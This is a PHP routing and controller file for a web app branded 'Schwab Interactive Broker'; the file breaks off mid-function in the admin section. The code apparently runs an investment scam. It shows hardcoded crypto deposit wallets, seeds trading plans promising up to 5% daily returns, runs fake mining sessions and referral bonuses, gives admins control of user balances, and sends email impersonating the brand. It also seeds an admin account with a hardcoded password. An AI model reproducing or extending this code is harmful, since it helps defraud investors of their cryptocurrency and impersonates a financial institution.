<?php
// Serve static files directly when using PHP built-in server
if (php_sapi_name() === 'cli-server') {
    $requestFile = __DIR__ . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    if (is_file($requestFile)) {
        return false;
    }
}

session_start();
define('ROOT', dirname(__DIR__));

// Load cPanel/MySQL env config if present (created by install.php or manually)
$_envFile = ROOT . '/app/config/env.php';
if (file_exists($_envFile)) require_once $_envFile;

require_once ROOT . '/app/config/database.php';

// ─────────────────────────────────────────────────────────────────────────────
//  HELPERS
// ─────────────────────────────────────────────────────────────────────────────
function redirect(string $path): void { header("Location: $path"); exit; }
function isLoggedIn(): bool { return isset($_SESSION['user_id']); }
function isAdmin(): bool { return isset($_SESSION['role']) && $_SESSION['role'] === 'admin'; }
function requireLogin(): void { if (!isLoggedIn()) redirect('/login'); }
function requireAdmin(): void {
    if (!isLoggedIn()) redirect('/login');
    if (!isAdmin()) redirect('/dashboard');
}
function view(string $template, array $data = []): void {
    extract($data);
    require ROOT . "/app/views/$template.php";
}
function e(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function formatMoney(float $amount): string { return '$' . number_format($amount, 2); }
function flash(string $key, string $msg = ''): string {
    if ($msg !== '') { $_SESSION['flash'][$key] = $msg; return ''; }
    $val = $_SESSION['flash'][$key] ?? '';
    unset($_SESSION['flash'][$key]);
    return $val;
}

// Crypto deposit addresses
function getCryptoAddresses(): array {
    return [
        'bitcoin'  => ['name'=>'Bitcoin',  'symbol'=>'BTC', 'icon'=>'fab fa-bitcoin',    'address'=>'bc1qk9dxqh9yv2cvymvfnj0stndcjnzch3a28ffe2t', 'color'=>'#f7931a'],
        'ethereum' => ['name'=>'Ethereum', 'symbol'=>'ETH', 'icon'=>'fab fa-ethereum',   'address'=>'0xa60843feE63458c292cecA5569a83c3F7125a084',  'color'=>'#627eea'],
        'solana'   => ['name'=>'Solana',   'symbol'=>'SOL', 'icon'=>'fas fa-sun',         'address'=>'CsrdQNRw2PpNNUnjo53sQorx7UVRyxnhZaV3sAzEh2v', 'color'=>'#9945ff'],
        'bnb'      => ['name'=>'BNB',      'symbol'=>'BNB', 'icon'=>'fas fa-coins',       'address'=>'0xa60843feE63458c292cecA5569a83c3F7125a084',  'color'=>'#f3ba2f'],
        'usdt'     => ['name'=>'USDT',     'symbol'=>'USDT','icon'=>'fas fa-dollar-sign', 'address'=>'0xa60843feE63458c292cecA5569a83c3F7125a084',  'color'=>'#26a17b'],
        'usdc'     => ['name'=>'USDC',     'symbol'=>'USDC','icon'=>'fas fa-circle-dollar-to-slot','address'=>'0xa60843feE63458c292cecA5569a83c3F7125a084','color'=>'#2775ca'],
        'twt'      => ['name'=>'Trust Wallet Token','symbol'=>'TWT','icon'=>'fas fa-shield-halved','address'=>'0xa60843feE63458c292cecA5569a83c3F7125a084','color'=>'#3375bb'],
    ];
}

// Send email helper
function sendMail(string $to, string $subject, string $htmlBody): bool {
    $from    = 'noreply@schwabinteractivebroker.com';
    $fromName = 'Schwab Interactive Broker';
    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: $fromName <$from>\r\n";
    $headers .= "Reply-To: support@schwabinteractivebroker.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    return mail($to, $subject, $htmlBody, $headers);
}

// ─────────────────────────────────────────────────────────────────────────────
//  SCHEMA INIT
// ─────────────────────────────────────────────────────────────────────────────
function initSchema(): void {
    $pdo = getDbConnection();
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS users (
            id              SERIAL PRIMARY KEY,
            full_name       VARCHAR(200) NOT NULL,
            email           VARCHAR(200) UNIQUE NOT NULL,
            phone           VARCHAR(30),
            country         VARCHAR(100),
            gender          VARCHAR(10),
            address         TEXT,
            password_hash   VARCHAR(255) NOT NULL,
            role            VARCHAR(20)  NOT NULL DEFAULT 'user',
            balance         NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            total_profit    NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            bonus           NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            referral_bonus  NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            withdrawals     NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            referral_code   VARCHAR(20)   UNIQUE,
            referred_by     INT REFERENCES users(id) ON DELETE SET NULL,
            is_active       BOOLEAN NOT NULL DEFAULT TRUE,
            is_restricted   BOOLEAN NOT NULL DEFAULT FALSE,
            created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            updated_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS transactions (
            id          SERIAL PRIMARY KEY,
            user_id     INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            type        VARCHAR(30) NOT NULL,
            amount      NUMERIC(15,2) NOT NULL,
            status      VARCHAR(20) NOT NULL DEFAULT 'pending',
            description TEXT,
            coin        VARCHAR(20),
            wallet      VARCHAR(255),
            created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS trading_plans (
            id            SERIAL PRIMARY KEY,
            name          VARCHAR(100) NOT NULL,
            min_amount    NUMERIC(15,2) NOT NULL,
            max_amount    NUMERIC(15,2) NOT NULL,
            daily_return  NUMERIC(5,2) NOT NULL,
            duration_days INT NOT NULL,
            description   TEXT,
            is_active     BOOLEAN NOT NULL DEFAULT TRUE
        );
        CREATE TABLE IF NOT EXISTS user_plans (
            id            SERIAL PRIMARY KEY,
            user_id       INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            plan_id       INT NOT NULL REFERENCES trading_plans(id),
            amount        NUMERIC(15,2) NOT NULL,
            profit_earned NUMERIC(15,2) NOT NULL DEFAULT 0.00,
            status        VARCHAR(20) NOT NULL DEFAULT 'active',
            started_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
            ends_at       TIMESTAMPTZ NOT NULL
        );
        CREATE TABLE IF NOT EXISTS notifications (
            id         SERIAL PRIMARY KEY,
            user_id    INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            title      VARCHAR(200) NOT NULL,
            message    TEXT NOT NULL,
            is_read    BOOLEAN NOT NULL DEFAULT FALSE,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS support_tickets (
            id         SERIAL PRIMARY KEY,
            user_id    INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            subject    VARCHAR(200) NOT NULL,
            message    TEXT NOT NULL,
            status     VARCHAR(20) NOT NULL DEFAULT 'open',
            reply      TEXT,
            replied_at TIMESTAMPTZ,
            created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS email_logs (
            id         SERIAL PRIMARY KEY,
            user_id    INT REFERENCES users(id) ON DELETE SET NULL,
            to_email   VARCHAR(200) NOT NULL,
            subject    VARCHAR(200) NOT NULL,
            body       TEXT,
            sent_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS mining_sessions (
            id          SERIAL PRIMARY KEY,
            user_id     INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            type        VARCHAR(50) NOT NULL,
            status      VARCHAR(20) NOT NULL DEFAULT 'active',
            started_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
        );
    ");

    // Add missing columns (safe for existing DBs)
    $cols = ['phone VARCHAR(30)', 'country VARCHAR(100)', 'gender VARCHAR(10)', 'address TEXT', 'is_restricted BOOLEAN NOT NULL DEFAULT FALSE'];
    foreach ($cols as $colDef) {
        $colName = explode(' ', $colDef)[0];
        try {
            $pdo->exec("ALTER TABLE users ADD COLUMN IF NOT EXISTS $colName " . implode(' ', array_slice(explode(' ', $colDef), 1)));
        } catch (Exception $e) { /* column exists */ }
    }
    try { $pdo->exec("ALTER TABLE transactions ADD COLUMN IF NOT EXISTS coin VARCHAR(20)"); } catch(Exception $e){}
    try { $pdo->exec("ALTER TABLE transactions ADD COLUMN IF NOT EXISTS wallet VARCHAR(255)"); } catch(Exception $e){}

    // Seed admin
    $admin = $pdo->query("SELECT id FROM users WHERE email='admin@schwabbroker.com' OR email='admin@admin.com'")->fetch();
    if (!$admin) {
        $hash = password_hash('Admin@2026Schwab', PASSWORD_BCRYPT);
        $pdo->prepare("INSERT INTO users (full_name,email,password_hash,role,referral_code) VALUES (?,?,?,'admin','ADMIN001')")
            ->execute(['Administrator', 'admin@schwabbroker.com', $hash]);
    }

    // Seed plans
    $count = $pdo->query("SELECT COUNT(*) as c FROM trading_plans")->fetch()['c'];
    if ($count == 0) {
        $pdo->exec("
            INSERT INTO trading_plans (name,min_amount,max_amount,daily_return,duration_days,description) VALUES
            ('Starter Plan',100,999,1.5,7,'Perfect for beginners. Low risk, steady daily returns.'),
            ('Silver Plan',1000,4999,2.5,14,'Balanced plan for intermediate investors.'),
            ('Gold Plan',5000,19999,3.5,21,'High-yield plan for serious investors.'),
            ('Platinum Plan',20000,999999,5.0,30,'Elite plan with maximum daily returns.');
        ");
    }
}

try { initSchema(); } catch (Exception $e) { /* continue */ }

// ─────────────────────────────────────────────────────────────────────────────
//  ROUTER
// ─────────────────────────────────────────────────────────────────────────────
$uri    = strtok($_SERVER['REQUEST_URI'], '?');
$method = $_SERVER['REQUEST_METHOD'];
if ($uri !== '/' && str_ends_with($uri, '/')) $uri = rtrim($uri, '/');

$routes = [
    'GET' => [
        '/'                      => 'landingPage',
        '/login'                 => 'loginPage',
        '/register'              => 'registerPage',
        '/logout'                => 'logout',
        '/dashboard'             => 'userDashboard',
        '/deposit'               => 'depositPage',
        '/withdraw'              => 'withdrawPage',
        '/transactions'          => 'transactionsPage',
        '/transfer'              => 'transferPage',
        '/trading-plans'         => 'tradingPlansPage',
        '/trade-signals'         => 'tradeSignalsPage',
        '/mining'                => 'miningPage',
        '/referrals'             => 'referralsPage',
        '/notifications'         => 'notificationsPage',
        '/support'               => 'supportPage',
        '/profile'               => 'profilePage',
        '/admin'                 => 'adminDashboard',
        '/admin/users'           => 'adminUsers',
        '/admin/transactions'    => 'adminTransactions',
        '/admin/plans'           => 'adminPlans',
        '/admin/tickets'         => 'adminTickets',
        '/admin/email-logs'      => 'adminEmailLogs',
        '/admin/notifications'   => 'adminNotificationsPage',
    ],
    'POST' => [
        '/login'                    => 'loginPost',
        '/register'                 => 'registerPost',
        '/deposit'                  => 'depositPost',
        '/withdraw'                 => 'withdrawPost',
        '/transfer'                 => 'transferPost',
        '/support'                  => 'supportPost',
        '/mining/start'             => 'miningStart',
        '/profile'                  => 'profilePost',
        '/admin/tx-action'          => 'adminTxAction',
        '/admin/user-toggle'        => 'adminUserToggle',
        '/admin/update-balance'     => 'adminUpdateBalance',
        '/admin/send-email'         => 'adminSendEmail',
        '/admin/restrict-user'      => 'adminRestrictUser',
        '/admin/add-notification'   => 'adminAddNotification',
        '/admin/reply-ticket'       => 'adminReplyTicket',
        '/admin/add-plan'           => 'adminAddPlan',
        '/admin/toggle-plan'        => 'adminTogglePlan',
    ],
];

// Admin user detail (dynamic)
if (preg_match('#^/admin/users/(\d+)$#', $uri, $m)) {
    adminUserDetail((int)$m[1]); exit;
}
// Admin ticket detail
if (preg_match('#^/admin/tickets/(\d+)$#', $uri, $m)) {
    adminTicketDetail((int)$m[1]); exit;
}

$handler = $routes[$method][$uri] ?? null;
if ($handler && function_exists($handler)) {
    $handler();
} else {
    http_response_code(404);
    view('404');
}

// ═════════════════════════════════════════════════════════════════════════════
//  CONTROLLERS — PUBLIC
// ═════════════════════════════════════════════════════════════════════════════

function landingPage(): void {
    if (isLoggedIn()) redirect(isAdmin() ? '/admin' : '/dashboard');
    view('landing');
}

function loginPage(): void {
    if (isLoggedIn()) redirect(isAdmin() ? '/admin' : '/dashboard');
    view('auth/login', ['error'=>flash('error'), 'success'=>flash('success')]);
}

function loginPost(): void {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if (!$email || !$pass) { flash('error','All fields required.'); redirect('/login'); }

    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
    $stmt->execute([$email]);
    $user = $stmt->fetch();

    if (!$user || !password_verify($pass, $user['password_hash'])) {
        flash('error','Invalid email or password.'); redirect('/login');
    }
    if (!$user['is_active']) {
        flash('error','Your account has been suspended. Contact support.'); redirect('/login');
    }
    if (!empty($user['is_restricted'])) {
        flash('error','Your account is restricted. Please contact support.'); redirect('/login');
    }

    $_SESSION['user_id']   = $user['id'];
    $_SESSION['full_name'] = $user['full_name'];
    $_SESSION['email']     = $user['email'];
    $_SESSION['role']      = $user['role'];

    redirect($user['role'] === 'admin' ? '/admin' : '/dashboard');
}

function registerPage(): void {
    if (isLoggedIn()) redirect('/dashboard');
    view('auth/register', ['error'=>flash('error')]);
}

function registerPost(): void {
    $name    = trim($_POST['full_name'] ?? '');
    $email   = trim($_POST['email'] ?? '');
    $phone   = trim($_POST['phone'] ?? '');
    $country = trim($_POST['country'] ?? '');
    $gender  = trim($_POST['gender'] ?? '');
    $address = trim($_POST['address'] ?? '');
    $pass    = $_POST['password'] ?? '';
    $ref     = trim($_POST['referral_code'] ?? '');

    if (!$name || !$email || !$pass) { flash('error','Name, email and password are required.'); redirect('/register'); }
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { flash('error','Invalid email address.'); redirect('/register'); }
    if (strlen($pass) < 6) { flash('error','Password must be at least 6 characters.'); redirect('/register'); }

    $pdo = getDbConnection();
    if ($pdo->prepare("SELECT id FROM users WHERE email=?")->execute([$email]) && $pdo->prepare("SELECT id FROM users WHERE email=?")->execute([$email])) {
        $exists = $pdo->prepare("SELECT id FROM users WHERE email=?");
        $exists->execute([$email]);
        if ($exists->fetch()) { flash('error','Email already registered.'); redirect('/register'); }
    }

    $hash    = password_hash($pass, PASSWORD_BCRYPT);
    $refCode = strtoupper(substr(md5($email.time()), 0, 8));
    $refById = null;

    if ($ref) {
        $ru = $pdo->prepare("SELECT id FROM users WHERE referral_code=?");
        $ru->execute([$ref]);
        $ru = $ru->fetch();
        if ($ru) {
            $refById = $ru['id'];
            $pdo->prepare("UPDATE users SET referral_bonus=referral_bonus+10 WHERE id=?")->execute([$refById]);
        }
    }

    $stmt = $pdo->prepare("INSERT INTO users (full_name,email,phone,country,gender,address,password_hash,referral_code,referred_by) VALUES (?,?,?,?,?,?,?,?,?)");
    $stmt->execute([$name,$email,$phone,$country,$gender,$address,$hash,$refCode,$refById]);
    $newId = (int)$pdo->lastInsertId();

    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$newId,'Welcome to Schwab Interactive Broker!','Your account has been created successfully. Start investing today and grow your portfolio with our expert trading plans.']);

    // Welcome email
    $welcomeHtml = emailTemplate('Welcome to Schwab Interactive Broker', "
        <h2>Welcome, ".htmlspecialchars($name)."!</h2>
        <p>Your account has been successfully created at Schwab Interactive Broker.</p>
        <p>You can now log in and start investing with our expertly curated trading plans.</p>
        <p><a href='https://schwabinteractivebroker.com/login' style='background:#00d4c8;color:#000;padding:12px 24px;text-decoration:none;border-radius:6px;display:inline-block;margin-top:10px;font-weight:600;'>Login to Your Account</a></p>
        <p style='margin-top:20px;color:#888;font-size:13px;'>Your referral code: <strong style='color:#00d4c8;'>$refCode</strong></p>
    ");
    sendMail($email, 'Welcome to Schwab Interactive Broker', $welcomeHtml);

    flash('success','Account created! Please login.');
    redirect('/login');
}

function logout(): void {
    session_destroy();
    redirect('/');
}

// ─────────────────────────────────────────────────────────────────────────────
//  USER PAGES
// ─────────────────────────────────────────────────────────────────────────────

function getUser(): array {
    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");
    $stmt->execute([$_SESSION['user_id']]);
    return $stmt->fetch() ?: [];
}

function getUnread(): int {
    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT COUNT(*) as c FROM notifications WHERE user_id=? AND is_read=FALSE");
    $stmt->execute([$_SESSION['user_id']]);
    return (int)$stmt->fetch()['c'];
}

function userDashboard(): void {
    requireLogin();
    $pdo  = getDbConnection();
    $user = getUser();

    $recentTx = $pdo->prepare("SELECT * FROM transactions WHERE user_id=? ORDER BY created_at DESC LIMIT 5");
    $recentTx->execute([$_SESSION['user_id']]);
    $recentTx = $recentTx->fetchAll();

    $activePlans = $pdo->prepare("
        SELECT up.*,tp.name as plan_name,tp.daily_return
        FROM user_plans up JOIN trading_plans tp ON up.plan_id=tp.id
        WHERE up.user_id=? AND up.status='active'
    ");
    $activePlans->execute([$_SESSION['user_id']]);
    $activePlans = $activePlans->fetchAll();

    $miningSession = $pdo->prepare("SELECT * FROM mining_sessions WHERE user_id=? AND status='active' ORDER BY started_at DESC LIMIT 1");
    $miningSession->execute([$_SESSION['user_id']]);
    $miningSession = $miningSession->fetch();

    $unread = getUnread();
    view('user/dashboard', compact('user','recentTx','activePlans','miningSession','unread'));
}

function depositPage(): void {
    requireLogin();
    $user    = getUser();
    $cryptos = getCryptoAddresses();
    $msg     = flash('success');
    $err     = flash('error');
    $unread  = getUnread();
    view('user/deposit', compact('user','cryptos','msg','err','unread'));
}

function depositPost(): void {
    requireLogin();
    $amount = (float)($_POST['amount'] ?? 0);
    $coin   = trim($_POST['coin'] ?? 'bitcoin');
    if ($amount < 10) { flash('error','Minimum deposit is $10.'); redirect('/deposit'); }

    $pdo = getDbConnection();
    $pdo->prepare("INSERT INTO transactions (user_id,type,amount,status,description,coin) VALUES (?,?,?,?,?,?)")
        ->execute([$_SESSION['user_id'],'deposit',$amount,'pending',"Crypto deposit via ".strtoupper($coin),$coin]);

    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],'Deposit Request Received',"Your deposit of ".formatMoney($amount)." via ".strtoupper($coin)." is under review. Approval within 30 minutes."]);

    flash('success','Deposit request submitted. Send the exact amount to the wallet address shown. Approval within 30 minutes.');
    redirect('/deposit');
}

function withdrawPage(): void {
    requireLogin();
    $user   = getUser();
    $msg    = flash('success');
    $err    = flash('error');
    $unread = getUnread();
    view('user/withdraw', compact('user','msg','err','unread'));
}

function withdrawPost(): void {
    requireLogin();
    $amount = (float)($_POST['amount'] ?? 0);
    $wallet = trim($_POST['wallet'] ?? '');
    $method = trim($_POST['method'] ?? '');

    if ($amount < 20) { flash('error','Minimum withdrawal is $20.'); redirect('/withdraw'); }
    if (!$wallet) { flash('error','Wallet address is required.'); redirect('/withdraw'); }

    $pdo = getDbConnection();
    $bal = (float)$pdo->prepare("SELECT balance FROM users WHERE id=?")->execute([$_SESSION['user_id']]) ? 0 : 0;
    $stmt = $pdo->prepare("SELECT balance FROM users WHERE id=?");
    $stmt->execute([$_SESSION['user_id']]);
    $bal = (float)$stmt->fetch()['balance'];

    if ($amount > $bal) { flash('error','Insufficient balance.'); redirect('/withdraw'); }

    $pdo->prepare("UPDATE users SET balance=balance-?,withdrawals=withdrawals+? WHERE id=?")
        ->execute([$amount,$amount,$_SESSION['user_id']]);
    $pdo->prepare("INSERT INTO transactions (user_id,type,amount,status,description,wallet) VALUES (?,?,?,?,?,?)")
        ->execute([$_SESSION['user_id'],'withdrawal',$amount,'pending',"Withdrawal via $method",$wallet]);
    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],'Withdrawal Submitted',"Your withdrawal of ".formatMoney($amount)." is processing. Expected in 24–48 hours."]);

    flash('success','Withdrawal request submitted. Processing in 24–48 hours.');
    redirect('/withdraw');
}

function transactionsPage(): void {
    requireLogin();
    $pdo  = getDbConnection();
    $user = getUser();
    $txs  = $pdo->prepare("SELECT * FROM transactions WHERE user_id=? ORDER BY created_at DESC");
    $txs->execute([$_SESSION['user_id']]);
    $txs    = $txs->fetchAll();
    $unread = getUnread();
    view('user/transactions', compact('user','txs','unread'));
}

function transferPage(): void {
    requireLogin();
    $user   = getUser();
    $msg    = flash('success');
    $err    = flash('error');
    $unread = getUnread();
    view('user/transfer', compact('user','msg','err','unread'));
}

function transferPost(): void {
    requireLogin();
    $toEmail = trim($_POST['to_email'] ?? '');
    $amount  = (float)($_POST['amount'] ?? 0);
    if (!$toEmail || $amount < 1) { flash('error','Invalid transfer details.'); redirect('/transfer'); }

    $pdo = getDbConnection();
    $toStmt = $pdo->prepare("SELECT id,full_name FROM users WHERE email=? AND role!='admin'");
    $toStmt->execute([$toEmail]);
    $toUser = $toStmt->fetch();
    if (!$toUser) { flash('error','Recipient not found.'); redirect('/transfer'); }
    if ($toUser['id'] == $_SESSION['user_id']) { flash('error','Cannot transfer to yourself.'); redirect('/transfer'); }

    $stmt = $pdo->prepare("SELECT balance FROM users WHERE id=?");
    $stmt->execute([$_SESSION['user_id']]);
    $bal = (float)$stmt->fetch()['balance'];
    if ($amount > $bal) { flash('error','Insufficient balance.'); redirect('/transfer'); }

    $pdo->prepare("UPDATE users SET balance=balance-? WHERE id=?")->execute([$amount,$_SESSION['user_id']]);
    $pdo->prepare("UPDATE users SET balance=balance+? WHERE id=?")->execute([$amount,$toUser['id']]);
    $pdo->prepare("INSERT INTO transactions (user_id,type,amount,status,description) VALUES (?,?,?,?,?)")
        ->execute([$_SESSION['user_id'],'transfer',$amount,'approved',"Transfer to {$toUser['full_name']} ($toEmail)"]);
    $pdo->prepare("INSERT INTO transactions (user_id,type,amount,status,description) VALUES (?,?,?,?,?)")
        ->execute([$toUser['id'],'transfer',$amount,'approved',"Received from {$_SESSION['full_name']}"]);

    flash('success',"Successfully transferred ".formatMoney($amount)." to {$toUser['full_name']}.");
    redirect('/transfer');
}

function tradingPlansPage(): void {
    requireLogin();
    $pdo   = getDbConnection();
    $user  = getUser();
    $plans = $pdo->query("SELECT * FROM trading_plans WHERE is_active=TRUE ORDER BY min_amount")->fetchAll();

    $activePlans = $pdo->prepare("
        SELECT up.*,tp.name as plan_name,tp.daily_return
        FROM user_plans up JOIN trading_plans tp ON up.plan_id=tp.id
        WHERE up.user_id=? AND up.status='active'
    ");
    $activePlans->execute([$_SESSION['user_id']]);
    $activePlans = $activePlans->fetchAll();

    $msg    = flash('success');
    $err    = flash('error');
    $unread = getUnread();
    view('user/trading_plans', compact('user','plans','activePlans','msg','err','unread'));
}

function tradeSignalsPage(): void {
    requireLogin();
    $user   = getUser();
    $unread = getUnread();
    view('user/trade_signals', compact('user','unread'));
}

function miningPage(): void {
    requireLogin();
    $pdo    = getDbConnection();
    $user   = getUser();
    $unread = getUnread();

    $myMining = $pdo->prepare("SELECT * FROM mining_sessions WHERE user_id=? ORDER BY started_at DESC");
    $myMining->execute([$_SESSION['user_id']]);
    $myMining = $myMining->fetchAll();

    $msg = flash('success');
    $err = flash('error');
    view('user/mining', compact('user','myMining','msg','err','unread'));
}

function miningStart(): void {
    requireLogin();
    $type = trim($_POST['type'] ?? '');
    $allowed = ['asic','gpu','cloud'];
    if (!in_array($type, $allowed)) { flash('error','Invalid mining type.'); redirect('/mining'); }

    $pdo = getDbConnection();
    // Check user has balance
    $stmt = $pdo->prepare("SELECT balance FROM users WHERE id=?");
    $stmt->execute([$_SESSION['user_id']]);
    $bal = (float)$stmt->fetch()['balance'];
    if ($bal < 100) { flash('error','Minimum balance of $100 required to start mining.'); redirect('/mining'); }

    $pdo->prepare("INSERT INTO mining_sessions (user_id,type,status) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],$type,'active']);
    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],'Mining Started',"Your ".ucfirst($type)." mining session has started. Earnings will reflect in your balance within 24 hours."]);

    flash('success',ucfirst($type).' mining started successfully! Earnings will update within 24 hours.');
    redirect('/mining');
}

function referralsPage(): void {
    requireLogin();
    $pdo  = getDbConnection();
    $user = getUser();
    $refs = $pdo->prepare("SELECT full_name,email,created_at FROM users WHERE referred_by=?");
    $refs->execute([$_SESSION['user_id']]);
    $refs   = $refs->fetchAll();
    $unread = getUnread();
    view('user/referrals', compact('user','refs','unread'));
}

function notificationsPage(): void {
    requireLogin();
    $pdo  = getDbConnection();
    $user = getUser();
    $pdo->prepare("UPDATE notifications SET is_read=TRUE WHERE user_id=?")->execute([$_SESSION['user_id']]);
    $notifs = $pdo->prepare("SELECT * FROM notifications WHERE user_id=? ORDER BY created_at DESC");
    $notifs->execute([$_SESSION['user_id']]);
    $notifs = $notifs->fetchAll();
    $unread = 0;
    view('user/notifications', compact('user','notifs','unread'));
}

function supportPage(): void {
    requireLogin();
    $pdo    = getDbConnection();
    $user   = getUser();
    $unread = getUnread();
    $tickets = $pdo->prepare("SELECT * FROM support_tickets WHERE user_id=? ORDER BY created_at DESC");
    $tickets->execute([$_SESSION['user_id']]);
    $tickets = $tickets->fetchAll();
    $msg = flash('success');
    $err = flash('error');
    view('user/support', compact('user','msg','err','tickets','unread'));
}

function supportPost(): void {
    requireLogin();
    $subject = trim($_POST['subject'] ?? '');
    $message = trim($_POST['message'] ?? '');
    if (!$subject || !$message) { flash('error','All fields required.'); redirect('/support'); }

    $pdo = getDbConnection();
    $pdo->prepare("INSERT INTO support_tickets (user_id,subject,message) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],$subject,$message]);
    $pdo->prepare("INSERT INTO notifications (user_id,title,message) VALUES (?,?,?)")
        ->execute([$_SESSION['user_id'],'Support Ticket Submitted',"Your ticket '$subject' has been received. We'll respond within 24 hours."]);

    flash('success',"Support ticket submitted. We'll respond within 24 hours.");
    redirect('/support');
}

function profilePage(): void {
    requireLogin();
    $user   = getUser();
    $unread = getUnread();
    $msg    = flash('success');
    $err    = flash('error');
    view('user/profile', compact('user','msg','err','unread'));
}

function profilePost(): void {
    requireLogin();
    $name    = trim($_POST['full_name'] ?? '');
    $phone   = trim($_POST['phone'] ?? '');
    $country = trim($_POST['country'] ?? '');
    $gender  = trim($_POST['gender'] ?? '');
    $address = trim($_POST['address'] ?? '');
    $pass    = $_POST['new_password'] ?? '';

    if (!$name) { flash('error','Name is required.'); redirect('/profile'); }

    $pdo = getDbConnection();
    if ($pass) {
        if (strlen($pass) < 6) { flash('error','New password must be at least 6 characters.'); redirect('/profile'); }
        $hash = password_hash($pass, PASSWORD_BCRYPT);
        $pdo->prepare("UPDATE users SET full_name=?,phone=?,country=?,gender=?,address=?,password_hash=?,updated_at=NOW() WHERE id=?")
            ->execute([$name,$phone,$country,$gender,$address,$hash,$_SESSION['user_id']]);
    } else {
        $pdo->prepare("UPDATE users SET full_name=?,phone=?,country=?,gender=?,address=?,updated_at=NOW() WHERE id=?")
            ->execute([$name,$phone,$country,$gender,$address,$_SESSION['user_id']]);
    }

    $_SESSION['full_name'] = $name;
    flash('success','Profile updated successfully.');
    redirect('/profile');
}

// ═════════════════════════════════════════════════════════════════════════════
//  ADMIN CONTROLLERS
// ═════════════════════════════════════════════════════════════════════════════

function adminDashboard(): void {
    requireAdmin();
    $pdo = getDbConnection();

    $totalUsers    = $pdo->query("SELECT COUNT(*) as c FROM users WHERE role='user'")->fetch()['c'];
    $activeUsers   = $pdo->query("SELECT COUNT(*) as c FROM users WHERE role='user' AND is_active=TRUE")->fetch()['c'];
    $totalBal      = $pdo->query("SELECT COALESCE(SUM(balance),0) as s FROM users WHERE role='user'")->fetch()['s'];
    $pendingTx     = $pdo->query("SELECT COUNT(*) as c FROM transactions WHERE status='pending'")->fetch()['c'];
    $totalTx       = $pdo->query("SELECT COUNT(*) as c FROM transactions")->fetch()['c'];
    $totalDeposits = $pdo->query("SELECT COALESCE(SUM(amount),0) as s FROM transactions WHERE type='deposit' AND status='approved'")->fetch()['s'];
    $totalWithdraws= $pdo->query("SELECT COALESCE(SUM(amount),0) as s FROM transactions WHERE type='withdrawal' AND status='approved'")->fetch()['s'];
    $openTickets   = $pdo->query("SELECT COUNT(*) as c FROM support_tickets WHERE status='open'")->fetch()['c'];

    $recentUsers = $pdo->query("SELECT * FROM users WHERE role='user' ORDER BY created_at DESC LIMIT 8")->fetchAll();
    $recentTx    = $pdo->query("SELECT t.*,u.full_name,u.email FROM transactions t JOIN users u ON t.user_id=u.id ORDER BY t.created_at DESC LIMIT 10")->fetchAll();

    view('admin/dashboard', compact('totalUsers','activeUsers','totalBal','pendingTx','totalTx','totalDeposits','totalWithdraws','openTickets','recentUsers','recentTx'));
}

function adminUsers(): void {
    requireAdmin();
    $pdo   = getDbConnection();
    $search = trim($_GET['q'] ?? '');
    if ($search) {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE role='user' AND (full_name ILIKE ? OR email ILIKE ? OR phone ILIKE ?) ORDER BY created_at DESC");
        $stmt->execute(["%$search%","%$search%","%$search%"]);
        $users = $stmt->fetchAll();
    } else {
        $users = $pdo->query("SELECT * FROM users WHERE role='user' ORDER BY created_at DESC")->fetchAll();
    }
    $msg = flash('success');
    $err = flash('error');
    view('admin/users', compact('users','search','msg','err'));
}

function adminUserDetail(int $id): void {
    requireAdmin();
    $pdo  = getDbConnection();
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");
    $stmt->execute([$id]);
    $user = $stmt->fetch();
    if (!$user) { http_response_code(404); view('404'); return; }

    $txs = $pdo->prepare("SELECT * FROM transactions WHERE user_id=? ORDER BY created_at DESC");
    $txs->execute([$id]);
    $txs = $txs->fetchAll();

    $plans = $pdo->prepare("SELECT up.*,tp.name as plan_name FROM user_plans up JOIN trading_plans tp ON up.plan_id=tp.id WHERE up.user_id=?");
    $plans->execute([$id]);
    $plans = $plans->fetchAll();

    $tickets = $pdo->prepare("SELECT * FROM support_tickets WHERE user_id=? ORDER BY created_at DESC");
